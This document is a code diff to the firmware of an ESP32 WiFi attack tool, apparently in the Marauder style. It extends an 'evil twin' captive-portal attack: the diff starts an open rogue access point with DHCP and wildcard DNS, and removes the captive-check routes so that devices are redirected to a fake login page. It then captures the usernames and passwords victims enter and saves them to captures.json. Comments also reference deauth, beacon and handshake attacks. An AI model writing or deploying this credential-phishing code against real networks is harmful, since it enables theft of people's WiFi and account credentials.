@@ -5,6 +5,7 @@
 #include "CommandLine.h"
 #include "esp_mac.h"      // esp_efuse_mac_get_default for management identity
 #include "esp_netif.h"    // AP DHCP server status check in rearmManagementAP()
+#include "esp_wifi.h"     // esp_wifi_stop/deinit for BLE heap reclaim
 #include "NfcInterface.h" // NFC read/write for management API
 #include <Update.h>       // OTA firmware update via web upload
 #include <ArduinoJson.h>  // E: Bug E — proper JSON body parsing
@@ -1061,6 +1062,12 @@ void EvilPortal::setupManagementServer() {
     SPIFFS.rename("/portal_mgmt.html", "/portal.html");
     Serial.println("[MGMT] Management portal restored from backup");
   }
+  // Restore gzipped management dashboard if stashed by evil twin
+  if (SPIFFS.exists("/portal_mgmt.html.gz")) {
+    SPIFFS.remove("/portal.html.gz");
+    SPIFFS.rename("/portal_mgmt.html.gz", "/portal.html.gz");
+    Serial.println("[MGMT] Management portal.gz restored from backup");
+  }
 
   // Load persisted SSIDs from SPIFFS
   mgmtLoadSSIDs(ssids, wifi_scan_obj);
@@ -1475,19 +1482,35 @@ void EvilPortal::setupManagementServer() {
     if (needTeardown) {
       Serial.println("[BLE] Tearing down WiFi for BLE init...");
       delay(500); // let HTTP response flush completely
+
+      // Aggressive cleanup to defragment heap for BLE's contiguous need
+      this->dnsServer.stop();
       server.stop();
+      server.close();              // release all socket buffers
+
+      // Unmount SPIFFS to release its cache
+      SPIFFS.end();
+
+      // Full WiFi shutdown (keep driver initialized for recovery)
       WiFi.softAPdisconnect(true);
+      WiFi.disconnect(true, true);
       WiFi.mode(WIFI_MODE_NULL);
+      delay(100);
+      esp_wifi_stop();             // stop radio but keep driver alive
       this->management_active = false;
+
       delay(500);
-      Serial.printf("[BLE] Post-teardown largest block: %u bytes\n",
-                    (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
+
+      Serial.printf("[BLE] Post-teardown largest block: %u bytes, free: %u\n",
+                    (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT),
+                    (unsigned)ESP.getFreeHeap());
     }
 
     if (!wifi_scan_obj.ensureBLE()) {
       Serial.printf("[BLE] Init failed, largest=%u\n",
                     (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
-      // Restore AP
+      // Restore SPIFFS + AP
+      SPIFFS.begin(true);
       this->rearmManagementAP();
       this->management_active = true;
       server.begin();
@@ -2375,6 +2398,13 @@ void EvilPortal::setupManagementServer() {
       Serial.println("[MGMT] Management portal backed up");
     }
 
+    // Remove the gzipped management dashboard so mgmtServeFile won't
+    // prefer it over the evil template we're about to write.
+    if (SPIFFS.exists("/portal.html.gz")) {
+      SPIFFS.rename("/portal.html.gz", "/portal_mgmt.html.gz");
+      Serial.println("[MGMT] Stashed portal.html.gz as portal_mgmt.html.gz");
+    }
+
     // Write evil portal HTML as /portal.html so the captive handler serves it
     File f = SPIFFS.open("/portal.html", "w");
     f.print(html);
@@ -2392,19 +2422,48 @@ void EvilPortal::setupManagementServer() {
 
     // Tear down management
     server.stop();
+    this->dnsServer.stop();
     WiFi.softAPdisconnect(true);
-    delay(300);
+    delay(500);
 
-    // Start evil portal AP directly (no need for ssids/access_points lists)
+    // Start evil portal AP with explicit IP/DHCP (like management AP)
     WiFi.mode(WIFI_AP);
     delay(200);
+    IPAddress apIP(192, 168, 4, 1);
+    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
     WiFi.softAP(apName, "", ch);
+    delay(300);
+
+    // Ensure DHCP server is running (phones fail to join without leases)
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (ap_netif) {
+      esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
+      esp_netif_dhcps_get_status(ap_netif, &st);
+      if (st != ESP_NETIF_DHCP_STARTED) {
+        esp_err_t err = esp_netif_dhcps_start(ap_netif);
+        Serial.printf("[MGMT] ET DHCP was %d, start -> %d\n", (int)st, (int)err);
+      }
+      esp_netif_dhcps_get_status(ap_netif, &st);
+      Serial.printf("[MGMT] ET AP dhcps=%s\n",
+                    st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF");
+    }
+
     Serial.println("[MGMT] Evil Twin AP: " + String(apName) + " IP: " + WiFi.softAPIP().toString());
 
     // DNS wildcard for captive portal
     this->dnsServer.start(53, "*", WiFi.softAPIP());
 
-    // Setup server with captive portal routes (setupServer includes /get handler)
+    // Clear management captive-portal routes that fake "internet is ok".
+    // WebServer keeps routes across stop()/begin() cycles; the management
+    // handlers (Success / 204) would shadow the evil-portal redirects.
+    // Must specify HTTP_GET — removeRoute(HTTP_ANY) won't match HTTP_GET handlers.
+    server.removeRoute("/hotspot-detect.html", HTTP_GET);
+    server.removeRoute("/library/test/success.html", HTTP_GET);
+    server.removeRoute("/generate_204", HTTP_GET);
+    server.removeRoute("/connecttest.txt", HTTP_GET);
+    server.removeRoute("/ncsi.txt", HTTP_GET);
+
+    // Now register evil-portal routes (302 redirect → /portal.html)
     this->setupServer();
     server.begin();
     this->runServer = true;
@@ -2907,7 +2966,9 @@ void EvilPortal::mgmtServiceJob() {
       this->mgmt_job_t0    = now;
     }
   } else if (this->mgmt_job_state == MGMT_JOB_ATTACK) {
-    if (this->mgmt_job_duration_s > 0 &&
+    // Generic attack timer (deauth, beacon, probe, handshake, sniffer — NOT evil twin)
+    if (this->mgmt_job_kind != "eviltwin" &&
+        this->mgmt_job_duration_s > 0 &&
         now - this->mgmt_job_t0 >= this->mgmt_job_duration_s * 1000UL) {
       Serial.println("[MGMT] job timer expired (" + this->mgmt_job_kind +
                      "); stopscan + rearm");
@@ -2933,8 +2994,45 @@ void EvilPortal::mgmtServiceJob() {
       this->mgmt_job_state = MGMT_JOB_REARM;
       this->mgmt_job_t0    = now;
     }
+    // Process evil twin captured credentials (main() is not called in mgmt mode)
+    if (this->mgmt_job_kind == "eviltwin" &&
+        this->name_received && this->password_received) {
+      this->name_received = false;
+      this->password_received = false;
+      Serial.println("[EP] Credential captured via evil twin:");
+      Serial.println("  user: " + this->user_name);
+      Serial.println("  pass: " + this->password);
+      // Save to captures.json (same logic as main())
+      {
+        static const size_t CAPTURES_MAX = 8192;
+        String existing = "";
+        if (SPIFFS.exists("/captures.json")) {
+          File rf = SPIFFS.open("/captures.json", "r");
+          existing = rf.readString();
+          rf.close();
+        }
+        if (existing.length() < 5) existing = "{\"captures\":[]}";
+        int pos = existing.lastIndexOf("]}");
+        if (pos > 0) {
+          String entry = "{\"user\":\"" + mgmtJsonEscape(this->user_name) +
+                         "\",\"pass\":\"" + mgmtJsonEscape(this->password) +
+                         "\",\"ap\":\"" + String(apName) +
+                         "\",\"t\":" + String(millis()/1000) + "}";
+          bool hasEntries = existing.indexOf("[{") > 0;
+          String updated = existing.substring(0, pos) +
+                          (hasEntries ? "," : "") + entry + "]}";
+          if (updated.length() <= CAPTURES_MAX) {
+            File wf = SPIFFS.open("/captures.json", "w");
+            if (wf) { wf.print(updated); wf.close(); }
+          }
+        }
+      }
+    }
   } else if (this->mgmt_job_state == MGMT_JOB_REARM) {
     if (now - this->mgmt_job_t0 >= 500) { // let stopscan settle the radio
+      // Remount SPIFFS if it was unmounted for BLE
+      if (!SPIFFS.begin(true))
+        Serial.println("[MGMT] WARNING: SPIFFS remount failed");
       this->rearmManagementAP();
       // If we came from evil twin, restart management server
       // (server.stop() was called; begin() starts it again)
